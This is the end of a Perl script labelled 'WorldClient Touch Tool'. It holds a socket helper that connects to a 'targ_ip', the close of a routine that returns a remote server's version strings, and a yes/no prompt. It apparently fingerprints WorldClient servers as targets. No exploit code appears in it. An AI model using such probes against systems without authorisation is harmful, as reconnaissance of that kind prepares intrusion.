			&EU_Log(1,"\n\t$WCStr" );

			close( $socket );

		} 
		else
		{
			$WCVer = -1; $WCStr= "a bad response was received from the server\n";
		}
	}
	}

	&EU_Log(1,"\n\n*************** WorldClient Touch Tool ***************\n\n" );

	return( $WCVer, $WCStr, $IISVer);
}

sub do_connect { 
  my ($targ_ip, $targ_port, $socket) = @_;

  while (!($socket = IO::Socket::INET->new(PeerAddr => $targ_ip, PeerPort => $targ_port, Proto => "tcp", 
	Type => SOCK_STREAM, Timeout => 7, ReuseAddr => 1) ) ) { 
	return -1;
  } 
  return $socket;
}

sub Yes_No() {
	my ($Prompt, $Default) = @_;
	my $Resp = $Default;

	while(1) 
	{
		$Resp = &EU_GetInput( "$Prompt","$Default");
		&EU_Log(0, "$Prompt $Resp");

		if( ($Resp eq "y") or ($Resp eq "yes") or ($Resp eq "Y") or ($Resp eq "YES") ) 
		{
			$Resp = "y";
			last;
		}
		elsif( ($Resp eq "n") or ($Resp eq "no") or ($Resp eq "N") or ($Resp eq "NO")  ) 
		{
			$Resp = "n";
			last;
		}
		else 
		{
			&EU_Log(1, "$Resp is an Invalid Response...\n");
			next;
		}
	}

	return $Resp;
}

__END__



